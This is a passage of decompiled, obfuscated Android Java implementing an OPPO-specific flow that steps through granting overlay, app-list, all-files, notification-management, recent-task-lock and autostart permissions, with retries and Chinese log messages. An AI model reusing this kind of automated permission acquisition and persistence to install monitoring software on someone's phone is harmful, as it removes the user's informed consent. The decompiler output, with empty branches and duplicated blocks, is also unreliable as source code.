                                                        long jCurrentTimeMillis222222 = System.currentTimeMillis() - r4;
                                                        t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                        t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222222) / 1000.0d)}, 1)) + str);
                                                        oppoStepsSimplified$execute$1.f54542a0 = null;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                    }
                                                    oppoStepsSimplified$execute$13 = oppoStepsSimplified$execute$1;
                                                }
                                            }
                                        }
                                        if (i5 >= 2) {
                                            j9 = c0368a57.f55125b4;
                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                            oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                            oppoStepsSimplified$execute$1.f54547a5 = 14;
                                            if (b81.m210571b1(j9, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                c0368a59 = c0368a57;
                                                r8 = c0368a59;
                                                i8 = 0;
                                            }
                                        } else {
                                            if (i5 > 0) {
                                                str12 = " (重试" + i5 + ")";
                                            } else {
                                                str12 = "";
                                            }
                                            t60.m214704c5("OppoSteps", "┌─── 悬浮窗" + str12 + " ───────────────────");
                                            if (Settings.canDrawOverlays(c0368a57.f55112a1)) {
                                                t60.m214704c5("OppoSteps", "│ 悬浮窗权限已开启，跳过");
                                                c0368a57.m212341e5("overlay");
                                                t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                                j9 = c0368a57.f55125b4;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54547a5 = 14;
                                                if (b81.m210571b1(j9, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                }
                                            } else if (i5 > 0) {
                                                t60.m214704c5("OppoSteps", str8);
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54544a2 = i5;
                                                oppoStepsSimplified$execute$1.f54547a5 = 11;
                                                if (c0368a57.m212347f2(oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                    i6 = i5;
                                                    j10 = c0368a57.f55126b5;
                                                    oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                    oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                    oppoStepsSimplified$execute$1.f54544a2 = i6;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 12;
                                                    if (b81.m210571b1(j10, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                                                        i5 = i6;
                                                        c0368a58 = c0368a57;
                                                        c0368a57 = c0368a58;
                                                        i7 = i5;
                                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                        oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                        oppoStepsSimplified$execute$1.f54544a2 = i7;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 13;
                                                        objM212330c8 = c0368a57.m212330c8(oppoStepsSimplified$execute$1);
                                                        if (objM212330c8 == coroutineSingletons) {
                                                        }
                                                        zBooleanValue3 = ((Boolean) objM212330c8).booleanValue();
                                                        t60.m214704c5("OppoSteps", "└─── 悬浮窗" + (!zBooleanValue3 ? "成功" : "失败") + " ───────────────────");
                                                        if (!zBooleanValue3 && !Settings.canDrawOverlays(c0368a57.f55112a1)) {
                                                            if (i7 < 1) {
                                                                t60.m214704c5("OppoSteps", "│ 悬浮窗未完成，准备重试...");
                                                            }
                                                            i5 = i7 + 1;
                                                            if (i5 >= 2) {
                                                            }
                                                        }
                                                        j9 = c0368a57.f55125b4;
                                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                        oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 14;
                                                        if (b81.m210571b1(j9, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                        }
                                                    }
                                                }
                                            } else {
                                                i7 = i5;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54544a2 = i7;
                                                oppoStepsSimplified$execute$1.f54547a5 = 13;
                                                objM212330c8 = c0368a57.m212330c8(oppoStepsSimplified$execute$1);
                                                if (objM212330c8 == coroutineSingletons) {
                                                }
                                                zBooleanValue3 = ((Boolean) objM212330c8).booleanValue();
                                                if (!zBooleanValue3) {
                                                }
                                                t60.m214704c5("OppoSteps", "└─── 悬浮窗" + (!zBooleanValue3 ? "成功" : "失败") + " ───────────────────");
                                                if (!zBooleanValue3) {
                                                    if (i7 < 1) {
                                                    }
                                                    i5 = i7 + 1;
                                                    if (i5 >= 2) {
                                                    }
                                                }
                                                j9 = c0368a57.f55125b4;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a57;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54547a5 = 14;
                                                if (b81.m210571b1(j9, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                }
                                            }
                                        }
                                        c0368a5 = r8;
                                        if (i8 >= 2) {
                                            j11 = c0368a5.f55125b4;
                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                                            oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                            oppoStepsSimplified$execute$1.f54547a5 = 18;
                                            if (b81.m210571b1(j11, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                c0368a512 = c0368a5;
                                                j12 = jCurrentTimeMillis;
                                                r8 = c0368a512;
                                                i10 = 0;
                                            }
                                        } else {
                                            if (i8 > 0) {
                                                str14 = " (重试" + i8 + ")";
                                            } else {
                                                str14 = "";
                                            }
                                            t60.m214704c5("OppoSteps", "┌─── 读取应用列表" + str14 + " ───────────────────");
                                            str13 = str4;
                                            boolean zM212336d92 = r8.m212336d9(str13);
                                            c0368a513 = r8;
                                            if (zM212336d92) {
                                                t60.m214704c5("OppoSteps", "│ 读取应用列表已完成，跳过");
                                                t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                                c0368a5 = r8;
                                                j11 = c0368a5.f55125b4;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54547a5 = 18;
                                                if (b81.m210571b1(j11, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                }
                                            } else if (i8 > 0) {
                                                t60.m214704c5("OppoSteps", str8);
                                                oppoStepsSimplified$execute$1.f54542a0 = r8;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54544a2 = i8;
                                                oppoStepsSimplified$execute$1.f54547a5 = 15;
                                                Object objM212347f23 = r8.m212347f2(oppoStepsSimplified$execute$1);
                                                c0368a510 = r8;
                                                if (objM212347f23 != coroutineSingletons) {
                                                    j13 = c0368a510.f55126b5;
                                                    oppoStepsSimplified$execute$1.f54542a0 = c0368a510;
                                                    oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                    oppoStepsSimplified$execute$1.f54544a2 = i8;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 16;
                                                    if (b81.m210571b1(j13, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                                                        i9 = i8;
                                                        c0368a511 = c0368a510;
                                                        i8 = i9;
                                                        c0368a513 = c0368a511;
                                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a513;
                                                        oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                        oppoStepsSimplified$execute$1.f54544a2 = i8;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 17;
                                                        objM212332d0 = c0368a513.m212332d0(oppoStepsSimplified$execute$1);
                                                        r8 = c0368a513;
                                                        break;
                                                    }
                                                }
                                            } else {
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a513;
                                                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                                                oppoStepsSimplified$execute$1.f54544a2 = i8;
                                                oppoStepsSimplified$execute$1.f54547a5 = 17;
                                                objM212332d0 = c0368a513.m212332d0(oppoStepsSimplified$execute$1);
                                                r8 = c0368a513;
                                            }
                                        }
                                        r8 = r8;
                                        if (i10 < 2) {
                                            if (i10 > 0) {
                                                try {
                                                    str15 = " (重试" + i10 + ")";
                                                } catch (Exception e14) {
                                                    e = e14;
                                                    r4 = j12;
                                                    r9 = obj3;
                                                    str = "秒)";
                                                    str2 = "ms (";
                                                    long jCurrentTimeMillis2222222 = System.currentTimeMillis() - r4;
                                                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2222222) / 1000.0d)}, 1)) + str);
                                                    oppoStepsSimplified$execute$1.f54542a0 = null;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                }
                                            } else {
                                                str15 = "";
                                            }
                                            t60.m214704c5("OppoSteps", "┌─── 文件访问" + str15 + " ───────────────────");
                                            if (r8.f55113a2 < 30 || !Environment.isExternalStorageManager()) {
                                                int i18 = r8.f55113a2;
                                                c0368a517 = r8;
                                                if (i18 < 30) {
                                                    t60.m214704c5("OppoSteps", "│ Android 11以下不需要文件访问权限，跳过");
                                                    r8.m212341e5("fileaccess");
                                                    t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                                    r8 = r8;
                                                } else if (i10 > 0) {
                                                    t60.m214704c5("OppoSteps", str8);
                                                    oppoStepsSimplified$execute$1.f54542a0 = r8;
                                                    oppoStepsSimplified$execute$1.f54543a1 = j12;
                                                    oppoStepsSimplified$execute$1.f54544a2 = i10;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 19;
                                                    Object objM212347f24 = r8.m212347f2(oppoStepsSimplified$execute$1);
                                                    c0368a514 = r8;
                                                    if (objM212347f24 != coroutineSingletons) {
                                                        j17 = c0368a514.f55126b5;
                                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a514;
                                                        oppoStepsSimplified$execute$1.f54543a1 = j12;
                                                        oppoStepsSimplified$execute$1.f54544a2 = i10;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 20;
                                                        if (b81.m210571b1(j17, oppoStepsSimplified$execute$1) == coroutineSingletons) {
                                                            i11 = i10;
                                                            j14 = j12;
                                                            c0368a515 = c0368a514;
                                                            c0368a517 = c0368a515;
                                                            j12 = j14;
                                                            i10 = i11;
                                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a517;
                                                            oppoStepsSimplified$execute$1.f54543a1 = j12;
                                                            oppoStepsSimplified$execute$1.f54544a2 = i10;
                                                            oppoStepsSimplified$execute$1.f54547a5 = 21;
                                                            objM212326c4 = c0368a517.m212326c4(oppoStepsSimplified$execute$1);
                                                            if (objM212326c4 != coroutineSingletons) {
                                                                j16 = j12;
                                                                i12 = i10;
                                                                r8 = c0368a517;
                                                                try {
                                                                    zBooleanValue5 = ((Boolean) objM212326c4).booleanValue();
                                                                    t60.m214704c5("OppoSteps", "└─── 文件访问" + (!zBooleanValue5 ? "成功" : "失败") + " ───────────────────");
                                                                    if (!zBooleanValue5 && (r8.f55113a2 < 30 || !Environment.isExternalStorageManager())) {
                                                                        if (i12 < 1) {
                                                                            t60.m214704c5("OppoSteps", "│ 文件访问未完成，准备重试...");
                                                                        }
                                                                        i10 = i12 + 1;
                                                                        j12 = j16;
                                                                        r8 = r8;
                                                                        r8 = r8;
                                                                        if (i10 < 2) {
                                                                        }
                                                                    }
                                                                    j12 = j16;
                                                                    r8 = r8;
                                                                } catch (Exception e15) {
                                                                    e = e15;
                                                                    r4 = j16;
                                                                    r9 = obj3;
                                                                    str = "秒)";
                                                                    str2 = "ms (";
                                                                    long jCurrentTimeMillis22222222 = System.currentTimeMillis() - r4;
                                                                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22222222) / 1000.0d)}, 1)) + str);
                                                                    oppoStepsSimplified$execute$1.f54542a0 = null;
                                                                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                                }
                                                            }
                                                        }
                                                    }
                                                } else {
                                                    oppoStepsSimplified$execute$1.f54542a0 = c0368a517;
                                                    oppoStepsSimplified$execute$1.f54543a1 = j12;
                                                    oppoStepsSimplified$execute$1.f54544a2 = i10;
                                                    oppoStepsSimplified$execute$1.f54547a5 = 21;
                                                    objM212326c4 = c0368a517.m212326c4(oppoStepsSimplified$execute$1);
                                                    if (objM212326c4 != coroutineSingletons) {
                                                    }
                                                }
                                            } else {
                                                t60.m214704c5("OppoSteps", "│ 文件访问权限已开启，跳过");
                                                r8.m212341e5("fileaccess");
                                                t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                                r8 = r8;
                                            }
                                        }
                                        try {
                                            j15 = r8.f55125b4;
                                            oppoStepsSimplified$execute$1.f54542a0 = r8;
                                            oppoStepsSimplified$execute$1.f54543a1 = j12;
                                            oppoStepsSimplified$execute$1.f54547a5 = 22;
                                            if (b81.m210571b1(j15, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                c0368a516 = r8;
                                                r8 = c0368a516;
                                                i13 = 0;
                                                if (i13 < 2) {
                                                    if (i13 > 0) {
                                                        str17 = " (重试" + i13 + str21;
                                                    } else {
                                                        str17 = "";
                                                    }
                                                    t60.m214704c5("OppoSteps", "┌─── 通知管理" + str17 + " ───────────────────");
                                                    str16 = str3;
                                                    if (r8.m212336d9(str16)) {
                                                        t60.m214704c5("OppoSteps", "│ 通知管理已完成，跳过");
                                                        t60.m214704c5("OppoSteps", "└─────────────────────────────────────────────");
                                                    } else if (i13 > 0) {
                                                        t60.m214704c5("OppoSteps", str8);
                                                        oppoStepsSimplified$execute$1.f54542a0 = r8;
                                                        oppoStepsSimplified$execute$1.f54543a1 = j12;
                                                        oppoStepsSimplified$execute$1.f54544a2 = i13;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 23;
                                                        Object objM212347f25 = r8.m212347f2(oppoStepsSimplified$execute$1);
                                                        c0368a518 = r8;
                                                        if (objM212347f25 != coroutineSingletons) {
                                                            j22 = c0368a518.f55126b5;
                                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a518;
                                                            oppoStepsSimplified$execute$1.f54543a1 = j12;
                                                            oppoStepsSimplified$execute$1.f54544a2 = i13;
                                                            oppoStepsSimplified$execute$1.f54547a5 = 24;
                                                            if (b81.m210571b1(j22, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                                try {
                                                                    i14 = i13;
                                                                    long j30 = j12;
                                                                    c0368a519 = c0368a518;
                                                                    j18 = j30;
                                                                    oppoStepsSimplified$execute$1.f54542a0 = c0368a519;
                                                                    oppoStepsSimplified$execute$1.f54543a1 = j18;
                                                                    oppoStepsSimplified$execute$1.f54544a2 = i15;
                                                                    oppoStepsSimplified$execute$1.f54547a5 = 25;
                                                                    objM212327c5 = c0368a519.m212327c5(oppoStepsSimplified$execute$1);
                                                                    if (objM212327c5 != coroutineSingletons) {
                                                                        j21 = j18;
                                                                        r8 = c0368a519;
                                                                        i16 = i15;
                                                                        try {
                                                                            zBooleanValue6 = ((Boolean) objM212327c5).booleanValue();
                                                                            String str23 = !zBooleanValue6 ? "成功" : "失败";
                                                                            StringBuilder sb2 = new StringBuilder();
                                                                            str18 = str21;
                                                                            sb2.append("└─── 通知管理");
                                                                            sb2.append(str23);
                                                                            sb2.append(" ───────────────────");
                                                                            t60.m214704c5("OppoSteps", sb2.toString());
                                                                            if (!zBooleanValue6 && !r8.m212336d9(str16)) {
                                                                                if (i16 < 1) {
                                                                                    t60.m214704c5("OppoSteps", "│ 通知管理未完成，准备重试...");
                                                                                }
                                                                                i13 = i16 + 1;
                                                                                str21 = str18;
                                                                                str3 = str16;
                                                                                j12 = j21;
                                                                                r8 = r8;
                                                                                if (i13 < 2) {
                                                                                }
                                                                            }
                                                                            j19 = j21;
                                                                            c0368a520 = r8;
                                                                            j20 = c0368a520.f55125b4;
                                                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a520;
                                                                            oppoStepsSimplified$execute$1.f54543a1 = j19;
                                                                            oppoStepsSimplified$execute$1.f54547a5 = 26;
                                                                            j23 = j19;
                                                                            c0368a521 = c0368a520;
                                                                            if (b81.m210571b1(j20, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                                                t60.m214704c5("OppoSteps", "┌─── 最近任务锁定 ───────────────────");
                                                                                try {
                                                                                    try {
                                                                                        try {
                                                                                            t60.m214704c5("OppoSteps", "│ 执行OPPO专用锁定流程...");
                                                                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a521;
                                                                                            oppoStepsSimplified$execute$1.f54543a1 = j23;
                                                                                            oppoStepsSimplified$execute$1.f54547a5 = 27;
                                                                                            objM212328c6 = c0368a521.m212328c6(oppoStepsSimplified$execute$1);
                                                                                            j26 = j23;
                                                                                            c0368a524 = c0368a521;
                                                                                            if (objM212328c6 == coroutineSingletons) {
                                                                                            }
                                                                                            if (((Boolean) objM212328c6).booleanValue()) {
                                                                                                t60.m214704c5("OppoSteps", "│ OPPO锁定成功");
                                                                                                c0368a524.m212341e5("applock");
                                                                                                j25 = j26;
                                                                                                c0368a523 = c0368a524;
                                                                                            } else {
                                                                                                t60.m214704c5("OppoSteps", "│ OPPO锁定未确认成功");
                                                                                                j25 = j26;
                                                                                                c0368a523 = c0368a524;
                                                                                            }
                                                                                        } catch (Exception e16) {
                                                                                            e = e16;
                                                                                            j24 = j23;
                                                                                            c0368a522 = c0368a521;
                                                                                            t60.m214705c6("OppoSteps", "│ 应用锁定失败: " + e.getMessage(), e);
                                                                                            j25 = j24;
                                                                                            c0368a523 = c0368a522;
                                                                                            t60.m214704c5("OppoSteps", "└─── 最近任务锁定 完成 ───────────────────");
                                                                                            oppoStepsSimplified$execute$1.f54542a0 = c0368a523;
                                                                                            oppoStepsSimplified$execute$1.f54543a1 = j25;
                                                                                            oppoStepsSimplified$execute$1.f54547a5 = 28;
                                                                                            objM212347f2 = c0368a523.m212347f2(oppoStepsSimplified$execute$1);
                                                                                            r4 = j25;
                                                                                            r8 = c0368a523;
                                                                                            if (objM212347f2 == coroutineSingletons) {
                                                                                            }
                                                                                            long jCurrentTimeMillis3 = System.currentTimeMillis() - r4;
                                                                                            t60.m214704c5("OppoSteps", str5);
                                                                                            t60.m214704c5("OppoSteps", "║  OPPO授权流程完成");
                                                                                            r9 = obj3;
                                                                                            String str24 = String.format(r9, Arrays.copyOf(new Object[]{new Double(jCurrentTimeMillis3 / 1000.0d)}, 1));
                                                                                            StringBuilder sb3 = new StringBuilder();
                                                                                            sb3.append("║  总耗时: ");
                                                                                            sb3.append(jCurrentTimeMillis3);
                                                                                            str2 = "ms (";
                                                                                            sb3.append(str2);
                                                                                            sb3.append(str24);
                                                                                            str = "秒)";
                                                                                            sb3.append(str);
                                                                                            t60.m214704c5("OppoSteps", sb3.toString());
                                                                                            t60.m214704c5("OppoSteps", str9);
                                                                                            return t60.m214689a7(true);
                                                                                        }
                                                                                        sb3.append(str);
                                                                                        t60.m214704c5("OppoSteps", sb3.toString());
                                                                                        t60.m214704c5("OppoSteps", str9);
                                                                                        return t60.m214689a7(true);
                                                                                    } catch (Exception e17) {
                                                                                        e = e17;
                                                                                        long jCurrentTimeMillis222222222 = System.currentTimeMillis() - r4;
                                                                                        t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                                                        t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222222222) / 1000.0d)}, 1)) + str);
                                                                                        oppoStepsSimplified$execute$1.f54542a0 = null;
                                                                                        oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                                                    }
                                                                                    String str242 = String.format(r9, Arrays.copyOf(new Object[]{new Double(jCurrentTimeMillis3 / 1000.0d)}, 1));
                                                                                    StringBuilder sb32 = new StringBuilder();
                                                                                    sb32.append("║  总耗时: ");
                                                                                    sb32.append(jCurrentTimeMillis3);
                                                                                    str2 = "ms (";
                                                                                    sb32.append(str2);
                                                                                    sb32.append(str242);
                                                                                    str = "秒)";
                                                                                } catch (Exception e18) {
                                                                                    e = e18;
                                                                                    str = "秒)";
                                                                                    str2 = "ms (";
                                                                                    long jCurrentTimeMillis2222222222 = System.currentTimeMillis() - r4;
                                                                                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                                                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2222222222) / 1000.0d)}, 1)) + str);
                                                                                    oppoStepsSimplified$execute$1.f54542a0 = null;
                                                                                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                                                }
                                                                                t60.m214704c5("OppoSteps", "└─── 最近任务锁定 完成 ───────────────────");
                                                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a523;
                                                                                oppoStepsSimplified$execute$1.f54543a1 = j25;
                                                                                oppoStepsSimplified$execute$1.f54547a5 = 28;
                                                                                objM212347f2 = c0368a523.m212347f2(oppoStepsSimplified$execute$1);
                                                                                r4 = j25;
                                                                                r8 = c0368a523;
                                                                                if (objM212347f2 == coroutineSingletons) {
                                                                                }
                                                                                long jCurrentTimeMillis32 = System.currentTimeMillis() - r4;
                                                                                t60.m214704c5("OppoSteps", str5);
                                                                                t60.m214704c5("OppoSteps", "║  OPPO授权流程完成");
                                                                                r9 = obj3;
                                                                            }
                                                                        } catch (Exception e19) {
                                                                            e = e19;
                                                                            r4 = j21;
                                                                            r9 = obj3;
                                                                            str = "秒)";
                                                                            str2 = "ms (";
                                                                            long jCurrentTimeMillis22222222222 = System.currentTimeMillis() - r4;
                                                                            t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                                            t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22222222222) / 1000.0d)}, 1)) + str);
                                                                            oppoStepsSimplified$execute$1.f54542a0 = null;
                                                                            oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                                        }
                                                                    }
                                                                } catch (Exception e20) {
                                                                    e = e20;
                                                                    r4 = j18;
                                                                    r8 = c0368a519;
                                                                    r9 = obj3;
                                                                    str = "秒)";
                                                                    str2 = "ms (";
                                                                    long jCurrentTimeMillis222222222222 = System.currentTimeMillis() - r4;
                                                                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                                                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222222222222) / 1000.0d)}, 1)) + str);
                                                                    oppoStepsSimplified$execute$1.f54542a0 = null;
                                                                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                                                                }
                                                                i15 = i14;
                                                            }
                                                        }
                                                    } else {
                                                        i15 = i13;
                                                        long j31 = j12;
                                                        c0368a519 = r8;
                                                        j18 = j31;
                                                        oppoStepsSimplified$execute$1.f54542a0 = c0368a519;
                                                        oppoStepsSimplified$execute$1.f54543a1 = j18;
                                                        oppoStepsSimplified$execute$1.f54544a2 = i15;
                                                        oppoStepsSimplified$execute$1.f54547a5 = 25;
                                                        objM212327c5 = c0368a519.m212327c5(oppoStepsSimplified$execute$1);
                                                        if (objM212327c5 != coroutineSingletons) {
                                                        }
                                                    }
                                                }
                                                j19 = j12;
                                                c0368a520 = r8;
                                                j20 = c0368a520.f55125b4;
                                                oppoStepsSimplified$execute$1.f54542a0 = c0368a520;
                                                oppoStepsSimplified$execute$1.f54543a1 = j19;
                                                oppoStepsSimplified$execute$1.f54547a5 = 26;
                                                j23 = j19;
                                                c0368a521 = c0368a520;
                                                if (b81.m210571b1(j20, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                                                }
                                            }
                                        } catch (Exception e21) {
                                            e = e21;
                                            r9 = obj3;
                                            str = "秒)";
                                            str2 = "ms (";
                                            r4 = j12;
                                            long jCurrentTimeMillis2222222222222 = System.currentTimeMillis() - r4;
                                            t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                            t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2222222222222) / 1000.0d)}, 1)) + str);
                                            oppoStepsSimplified$execute$1.f54542a0 = null;
                                            oppoStepsSimplified$execute$1.f54547a5 = 29;
                                        }
                                    }
                                } catch (Exception e22) {
                                    e = e22;
                                    r9 = obj3;
                                    str = "秒)";
                                    str2 = "ms (";
                                    r4 = j4;
                                    r8 = c0368a53;
                                    long jCurrentTimeMillis22222222222222 = System.currentTimeMillis() - r4;
                                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis22222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis22222222222222) / 1000.0d)}, 1)) + str);
                                    oppoStepsSimplified$execute$1.f54542a0 = null;
                                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                                }
                            }
                        } catch (Exception e23) {
                            e = e23;
                            r9 = obj3;
                            str = "秒)";
                            str2 = "ms (";
                            r4 = jCurrentTimeMillis;
                            r8 = c0368a52;
                            long jCurrentTimeMillis222222222222222 = System.currentTimeMillis() - r4;
                            t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                            t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis222222222222222) / 1000.0d)}, 1)) + str);
                            oppoStepsSimplified$execute$1.f54542a0 = null;
                            oppoStepsSimplified$execute$1.f54547a5 = 29;
                        }
                    }
                } catch (Exception e24) {
                    e = e24;
                    r9 = obj3;
                    str = "秒)";
                    str2 = "ms (";
                    r8 = this;
                    r4 = jCurrentTimeMillis;
                    long jCurrentTimeMillis2222222222222222 = System.currentTimeMillis() - r4;
                    t60.m214705c6("OppoSteps", "授权流程异常: " + e.getMessage(), e);
                    t60.m214704c5("OppoSteps", "异常前耗时: " + jCurrentTimeMillis2222222222222222 + str2 + String.format(r9, Arrays.copyOf(new Object[]{new Double(((double) jCurrentTimeMillis2222222222222222) / 1000.0d)}, 1)) + str);
                    oppoStepsSimplified$execute$1.f54542a0 = null;
                    oppoStepsSimplified$execute$1.f54547a5 = 29;
                }
                return coroutineSingletons;
            case 1:
                str3 = "notification";
                str4 = "applist";
                long j32 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a525 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str7 = "│ [重试] 先返回桌面...";
                c0368a5 = c0368a525;
                jCurrentTimeMillis = j32;
                str6 = "autostart";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                t60.m214704c5("OppoSteps", "└─── 基础权限 完成 ───────────────────");
                oppoStepsSimplified$execute$1.f54542a0 = c0368a5;
                oppoStepsSimplified$execute$1.f54543a1 = jCurrentTimeMillis;
                oppoStepsSimplified$execute$1.f54547a5 = 2;
                c0368a52 = c0368a5;
                if (b81.m210571b1(300L, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                str3 = "notification";
                str4 = "applist";
                long j33 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a53 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str7 = "│ [重试] 先返回桌面...";
                j4 = j33;
                str6 = "autostart";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                i = 0;
                if (i < 2) {
                }
                str8 = str7;
                str9 = str20;
                j5 = c0368a53.f55125b4;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                oppoStepsSimplified$execute$1.f54543a1 = j4;
                oppoStepsSimplified$execute$1.f54547a5 = 6;
                if (b81.m210571b1(j5, oppoStepsSimplified$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                str3 = "notification";
                str4 = "applist";
                int i19 = oppoStepsSimplified$execute$1.f54544a2;
                long j34 = oppoStepsSimplified$execute$1.f54543a1;
                c0368a53 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str8 = "│ [重试] 先返回桌面...";
                i = i19;
                j4 = j34;
                str6 = "autostart";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                str9 = str20;
                j6 = c0368a53.f55126b5;
                oppoStepsSimplified$execute$1.f54542a0 = c0368a53;
                oppoStepsSimplified$execute$1.f54543a1 = j4;
                oppoStepsSimplified$execute$1.f54544a2 = i;
                oppoStepsSimplified$execute$1.f54547a5 = 4;
